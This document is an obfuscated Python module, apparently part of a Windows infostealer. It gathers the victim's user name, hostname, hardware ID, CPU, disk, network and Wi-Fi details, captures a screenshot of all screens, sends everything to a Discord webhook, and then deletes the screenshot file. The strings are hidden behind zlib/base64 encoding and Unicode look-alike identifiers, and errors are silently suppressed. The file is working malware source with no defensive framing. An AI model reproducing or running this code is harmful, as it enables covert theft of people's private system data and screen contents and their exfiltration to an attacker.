import ctypes
import os
import re
import subprocess
import uuid
import psutil
import requests
import wmi
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
import time

class SystemInfo:

    def __init__(self, webhook):
        𝙬𝙚𝘣𝘩𝘰𝘰𝘬 = 𝙎𝙮𝘯𝙘𝗪𝗲𝘣𝙝𝙤𝗼𝘬.from_url(𝙬𝙚𝘣𝙝𝘰𝗼𝘬)
        𝘦𝙢𝘣𝘦𝙙 = 𝙀𝗺𝘣𝙚𝗱(title=__𝗶𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x0b5\xce\xa9Jq\x0f+\xf1t\xcd)\x8d\xca\xb5\xacL\nw3H\x0c\xb7,\x05\x00j\x0f\x08a')).decode(), color=𝘪𝙣𝙩.from_bytes(𝘮𝘢𝘱(lambda O, i: 722 - (𝙞𝗻𝘁(𝗢) + 𝗶), 𝙢𝗮𝗽(__𝗶𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝗶𝘵𝘦𝗿(__𝗶𝙢𝗽𝙤𝗿𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝘦(0)), __𝘪𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝗲𝙢𝗯𝘦𝙙.add_field(name=𝙨𝗲𝘭𝗳.user_data()[𝙞𝙣𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 762 - (𝙞𝘯𝘁(𝗢) + 𝘪), 𝘮𝘢𝘱(__𝙞𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝙞𝘵𝙚𝙧(__𝘪𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝗲(0)), __𝙞𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝘦𝙡𝘧.user_data()[𝙞𝘯𝘵.from_bytes(𝘮𝘢𝙥(lambda O, i: 656 - (𝗶𝙣𝘵(𝘖) + 𝘪), 𝙢𝙖𝘱(__𝘪𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝗶𝘵𝘦𝙧(__𝘪𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcb\n5\x04\x00\x03U\x01?')).decode())] * 3)), 𝗿𝘢𝙣𝗴𝗲(1)), __𝘪𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝙨𝗲𝙡𝗳.user_data()[𝙞𝗻𝙩.from_bytes(𝙢𝙖𝗽(lambda O, i: 627 - (𝘪𝙣𝘵(𝗢) + 𝙞), 𝙢𝗮𝘱(__𝘪𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝘪𝙩𝗲𝙧(__𝘪𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xcb\xf24\x04\x00\x03=\x013')).decode())] * 3)), 𝗿𝙖𝘯𝘨𝙚(1)), __𝗶𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝘦𝗺𝙗𝘦𝗱.add_field(name=𝙨𝗲𝗹𝙛.system_data()[𝙞𝙣𝙩.from_bytes(𝘮𝘢𝗽(lambda O, i: 692 - (𝗶𝗻𝘵(𝙊) + 𝗶), 𝙢𝙖𝙥(__𝘪𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝙞𝘁𝙚𝗿(__𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝗲(0)), __𝗶𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘴𝗲𝗹𝗳.system_data()[𝗶𝗻𝙩.from_bytes(𝘮𝙖𝘱(lambda O, i: 742 - (𝘪𝙣𝙩(𝙊) + 𝗶), 𝗺𝘢𝙥(__𝙞𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝙥(*[𝘪𝘁𝙚𝗿(__𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xab\n\xac\x00\x00\x03\xc4\x01\x92')).decode())] * 3)), 𝙧𝘢𝘯𝘨𝗲(1)), __𝙞𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝘦𝗹𝘧.system_data()[𝘪𝙣𝘵.from_bytes(𝘮𝙖𝙥(lambda O, i: 258 - (𝙞𝘯𝘵(𝘖) + 𝙞), 𝙢𝗮𝘱(__𝗶𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝙞𝘵𝘦𝘳(__𝘪𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcd\n5\x02\x00\x03R\x01?')).decode())] * 3)), 𝗿𝙖𝙣𝗴𝗲(1)), __𝘪𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝙚𝙢𝘣𝙚𝗱.add_field(name=𝙨𝗲𝗹𝙛.disk_data()[𝙞𝘯𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 916 - (𝘪𝙣𝘁(𝗢) + 𝗶), 𝘮𝙖𝘱(__𝗶𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝙩𝙚𝙧(__𝗶𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝘯𝙜𝙚(0)), __𝗶𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝘀𝗲𝗹𝙛.disk_data()[𝘪𝗻𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 369 - (𝙞𝗻𝘁(𝘖) + 𝘪), 𝗺𝗮𝘱(__𝙞𝙢𝗽𝗼𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝙞𝘁𝗲𝗿(__𝗶𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xad\x8a4\x01\x00\x03\x8c\x01U')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝗲(1)), __𝙞𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘴𝗲𝙡𝙛.disk_data()[𝙞𝙣𝘁.from_bytes(𝘮𝗮𝗽(lambda O, i: 825 - (𝙞𝗻𝘁(𝙊) + 𝗶), 𝙢𝗮𝙥(__𝙞𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝙩𝙚𝘳(__𝘪𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3w\xf1\xac\x02\x00\x03\x18\x01W')).decode())] * 3)), 𝘳𝗮𝘯𝗴𝘦(1)), __𝙞𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝙚𝘮𝗯𝙚𝙙.add_field(name=𝙨𝙚𝙡𝗳.network_data()[𝗶𝗻𝘁.from_bytes(𝗺𝙖𝘱(lambda O, i: 327 - (𝗶𝘯𝙩(𝘖) + 𝘪), 𝙢𝗮𝗽(__𝗶𝘮𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝘪𝘵𝙚𝘳(__𝘪𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝗲(0)), __𝘪𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝙚𝘭𝗳.network_data()[𝙞𝘯𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 299 - (𝘪𝙣𝙩(𝘖) + 𝘪), 𝗺𝙖𝗽(__𝙞𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝙞𝘁𝙚𝙧(__𝙞𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcd\xca6\x01\x00\x03\x80\x01W')).decode())] * 3)), 𝗿𝙖𝗻𝗴𝘦(1)), __𝗶𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝘀𝘦𝗹𝙛.network_data()[𝗶𝘯𝘵.from_bytes(𝗺𝙖𝗽(lambda O, i: 471 - (𝙞𝙣𝘁(𝘖) + 𝗶), 𝘮𝘢𝘱(__𝙞𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝙞𝘁𝙚𝙧(__𝘪𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\xf3s\x894\x05\x00\x02\xef\x01!')).decode())] * 3)), 𝙧𝘢𝗻𝙜𝘦(1)), __𝘪𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝗲𝗺𝘣𝘦𝗱.add_field(name=𝘴𝙚𝘭𝗳.wifi_data()[𝙞𝘯𝘵.from_bytes(𝗺𝙖𝙥(lambda O, i: 842 - (𝘪𝗻𝘁(𝗢) + 𝘪), 𝘮𝙖𝙥(__𝗶𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝗶𝙩𝗲𝗿(__𝙞𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝙚(0)), __𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], value=𝙨𝗲𝘭𝙛.wifi_data()[𝗶𝙣𝙩.from_bytes(𝘮𝘢𝙥(lambda O, i: 866 - (𝗶𝗻𝙩(𝘖) + 𝗶), 𝗺𝙖𝘱(__𝘪𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝘪𝙩𝘦𝗿(__𝙞𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3w\x894\x04\x00\x02\xef\x01\x1e')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝗲(1)), __𝘪𝗺𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], inline=𝙨𝙚𝙡𝘧.wifi_data()[𝘪𝗻𝘁.from_bytes(𝙢𝗮𝗽(lambda O, i: 876 - (𝘪𝘯𝘁(𝗢) + 𝙞), 𝙢𝗮𝘱(__𝙞𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝗶𝘁𝙚𝙧(__𝗶𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b"x\xda\xf3wI6\x00\x00\x03\x02\x01'")).decode())] * 3)), 𝙧𝙖𝘯𝘨𝗲(1)), __𝙞𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)])
        𝗶𝙢𝘢𝗴𝘦 = 𝙄𝗺𝘢𝘨𝗲𝘎𝗿𝘢𝘣.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)
        𝗶𝙢𝙖𝗴𝘦.save(__𝘪𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())
        𝗲𝗺𝘣𝗲𝘥.set_image(url=__𝗶𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8b\x8c\x082\x88\x0c\xf7\xcbO\n\x0f+Mq\xc9/\xf31\xf6\xcbJ\xce\r\xcbI\xca\x03\x8a\x19\x07\x96&\xbb\x9b\xe6\x01\x00\xe9\n\x0c\xb0')).decode())
        try:
            𝘄𝙚𝗯𝘩𝙤𝗼𝙠.send(embed=𝙚𝘮𝙗𝗲𝙙, file=𝘍𝙞𝘭𝘦(__𝘪𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xc9\xa9\xa8\x8a4\xf6\xca\x89\n7\xadJt\xb74\xf0\xc9s*\x8d*\xb7\xb5\x05\x00hj\x08\x1a')).decode(), filename=__𝙞𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()), username=__𝗶𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x0b\n7,O\x8d\xf0\xca\x89\x0c7\xb1\x05\x00\x1a0\x03\xe6')).decode(), avatar_url=__𝙞𝙢𝙥𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4,\xf0\xc9\xcd)\x892\x0e\xab\xf4\xc9\xf5+K\n\xb6\xf4L\xcc+\xc8M\xcc\x8d\n\xf6\xc9s*\x8d*\xb7\xb5\x05\x00Q\xda\x0fT')).decode())
        except:
            pass
        if 𝗼𝘀.path.exists(__𝘪𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode()):
            𝙤𝘀.remove(__𝗶𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK6\xf2\xab\x8c\n\x0f+M6\xca(Kq6-O\xcaM\xb6\x05\x00I\xc1\x07\x0e')).decode())

    def user_data(self):

        def display_name():
            𝗚𝙚𝘁𝘜𝙨𝙚𝗿𝘕𝗮𝙢𝙚𝙀𝘅 = 𝘤𝘁𝙮𝘱𝗲𝙨.windll.secur32.GetUserNameExW
            𝗡𝗮𝘮𝘦𝘋𝙞𝘴𝗽𝙡𝘢𝙮 = 𝘪𝙣𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 289 - (𝙞𝙣𝘵(𝘖) + 𝙞), 𝘮𝗮𝘱(__𝘪𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝗶𝘵𝘦𝘳(__𝗶𝘮𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcdJ7\x02\x00\x03v\x01Q')).decode())] * 3)), 𝙧𝗮𝗻𝙜𝙚(1)), __𝗶𝗺𝙥𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)
            𝙨𝙞𝙯𝙚 = 𝙘𝘁𝙮𝗽𝗲𝘴.pointer(𝘤𝘵𝘆𝘱𝘦𝘴.c_ulong(𝗶𝘯𝘵.from_bytes(𝙢𝗮𝙥(lambda O, i: 367 - (𝘪𝙣𝘵(𝙊) + 𝙞), 𝙢𝙖𝘱(__𝘪𝙢𝘱𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝙞𝙩𝙚𝘳(__𝘪𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝗻𝘨𝗲(0)), __𝙞𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)))
            𝘎𝘦𝙩𝘜𝘴𝘦𝙧𝘕𝘢𝗺𝙚𝙀𝘅(𝙉𝘢𝘮𝘦𝗗𝘪𝘀𝘱𝗹𝗮𝘆, None, 𝘴𝘪𝙯𝗲)
            𝙣𝙖𝗺𝘦𝘽𝙪𝗳𝗳𝘦𝙧 = 𝗰𝘁𝙮𝘱𝘦𝙨.create_unicode_buffer(𝙨𝘪𝘻𝙚.contents.value)
            𝗚𝘦𝙩𝘜𝘀𝗲𝘳𝗡𝗮𝗺𝘦𝗘𝙭(𝗡𝗮𝙢𝘦𝗗𝗶𝘴𝘱𝗹𝘢𝙮, 𝘯𝙖𝘮𝗲𝘉𝘶𝘧𝗳𝙚𝘳, 𝘴𝙞𝘻𝗲)
            return 𝗻𝘢𝙢𝙚𝘉𝙪𝘧𝘧𝘦𝘳.value
        𝙙𝙞𝙨𝘱𝙡𝙖𝘆_𝙣𝘢𝗺𝘦 = 𝙙𝗶𝘀𝙥𝙡𝘢𝙮_𝘯𝙖𝘮𝘦()
        𝙝𝘰𝘴𝘁𝘯𝘢𝙢𝗲 = 𝘰𝘴.getenv(__𝙞𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b"x\xda\x0b4\xb0\xf4\x0bu\x0b\x0b\r\n\xf3\xf2\x0f\x0c5t\x03\x00'w\x04\xad")).decode())
        𝙪𝘀𝗲𝘳𝘯𝙖𝗺𝗲 = 𝘰𝘀.getenv(__𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x0b\x0b\xf3s\x0b\xcd6u\n\t\r\xb5\x05\x00\x18\x9b\x03\xb3')).decode())
        return (__𝙞𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xcf\xf52L6\x0eJK\x0c7MK6\xca)Nt\xb74\x8c\x8a\x082\x88\n\xc9O\x0f\x8b\xf0\xcbIN\xb7\xb5\x05\x00\xd7\xba\x0b\xc3')).decode(), __𝗶𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8btwJ\x0fr\xcf\xa9Jv\xaf\xc8H\rv\xf2\x8f\x0c7\xcc\xf1\xcft2O\x0b,\xf0L2\xf63H\xcau+\x89\n\xc9OO56\xf0\x0e\x8b\xf0\xcbI\xce5\xcdH\n\x0f5\xf3\xf4(\xb1\x8c\x04\xea\x05\x00\xbfK\x15]')).decode().format(𝙙𝙞𝙨𝘱𝗹𝙖𝘺_𝗻𝘢𝘮𝗲, 𝘩𝗼𝘴𝘵𝙣𝗮𝗺𝗲, 𝘶𝘴𝗲𝘳𝗻𝙖𝘮𝘦), False)

    def system_data(self):

        def get_hwid():
            try:
                𝙝𝘸𝙞𝙙 = 𝘀𝘂𝘣𝙥𝗿𝙤𝙘𝗲𝘀𝘀.check_output(__𝗶𝘮𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x0b\xac*H\x0e3\xca)\x8dr\xb74N6\xac\x08I\x8d\xf03\x88\n7\xa8\xf2\xcd\xa90\x8e\xcc\r+\x89pK\xf1\x0b\x0e\xf5-\x8d\x8a\xc8\xc8\xf1t\xf7\xabJ\xf6\xf0*\x8b\xf2\x08\xcbJqv\xca\x8b\x8a\x08LO\x89\x08+\x88r\xb4\xb5\x05\x00\x89\xca\x18\xbc')).decode(), shell=True, stdin=𝘀𝙪𝙗𝗽𝗿𝗼𝗰𝗲𝙨𝘴.PIPE, stderr=𝘴𝘶𝘣𝗽𝗿𝗼𝙘𝘦𝘀𝘴.PIPE).decode(__𝙞𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝘪𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())[𝙞𝘯𝘵.from_bytes(𝙢𝙖𝙥(lambda O, i: 736 - (𝘪𝗻𝘁(𝗢) + 𝗶), 𝗺𝙖𝘱(__𝘪𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝙞𝙩𝗲𝙧(__𝗶𝗺𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xab\xf25\x04\x00\x03u\x01G')).decode())] * 3)), 𝙧𝘢𝗻𝙜𝘦(1)), __𝘪𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].strip()
            except:
                𝗵𝘄𝗶𝗱 = __𝗶𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xc9\xb5,\x8d\n\xb4\xb5\x05\x00\x0cT\x02\x95')).decode()
            return 𝗵𝙬𝗶𝘥
        𝙘𝙥𝙪 = 𝙬𝙢𝗶.WMI().Win32_Processor()[𝙞𝘯𝙩.from_bytes(𝘮𝘢𝗽(lambda O, i: 532 - (𝘪𝗻𝙩(𝘖) + 𝙞), 𝙢𝙖𝙥(__𝘪𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝘱(*[𝙞𝘵𝙚𝗿(__𝙞𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝙚(0)), __𝗶𝙢𝗽𝙤𝙧𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
